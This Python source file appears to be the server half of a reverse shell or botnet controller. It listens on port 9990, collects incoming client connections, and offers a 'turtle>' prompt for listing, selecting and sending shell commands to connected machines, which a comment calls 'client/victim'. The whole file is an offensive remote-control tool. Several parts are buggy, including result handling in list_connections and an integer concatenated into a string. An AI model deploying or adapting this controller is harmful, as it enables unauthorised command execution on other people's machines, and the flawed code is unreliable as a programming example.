import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_address = []

#create a socket (connect to computer)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9990 #this is a random port to avoid collision with other port
        s = socket.socket()  #a socket is created

    except socket.error as msg:
        print("Socket Creation error" + str(msg))

#binding the socket and listening connection

def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port" + str(port))

        s.bind((host,port)) #here we are binding the port and host IP
        s.listen(5) #it will tolerate atmost 5 connections

    except socket.error as msg:
        print("Socket binding error" + str(msg) +"\n" + "Retrying...")
        bind_socket() #it will retry to connect to the server.


#Handling connections from multiple clients and saving to a list
#closing all the previous connection when server.py file is restarted

def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1) #prevent timeout from happening

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been Established: " + address[0])

        except:
            print("Error accepting connection")


# 2nd thread function - 1)see all the clients 2)select a client 3) send commands to connected clients
# interactive prompt for sending commands

def start_turtle():

    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")

#Display all active connection with the clients
def list_connections():
    result = ''

    #selectID = 0
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' ')) #to check if the connection is established or not
            conn.recv(20480) #we set recv very high because we do not know how big the data we will recieve
        except: #it will throw an error if no connection
            del all_connections[i] #it will delete that connection if the conn is not established
            del all_address[i] #it will delete that particular address
            continue

        result = str(i) + " " + str(all_address[i][0] + " " + str(all_address[i][1] + "\n"))

    print("-----------Clients-------------" + "\n" + result)


def get_target(cmd):
    try:
        target = cmd.replace('select', '') #target ID
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to : " + str(all_address[target][0]))
        print(str(all_address[target][0] + ">", end=""))
        return conn

    except:
        print("Selection not valid")
        return None


#Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


def create_workers(): #this create worker threads
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work) #this create a thread with a specific work
        t.daemon = True #this make sure that thread ends when the program end
        t.start()

#Do next job that is in the queue

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()

create_workers()
create_jobs()
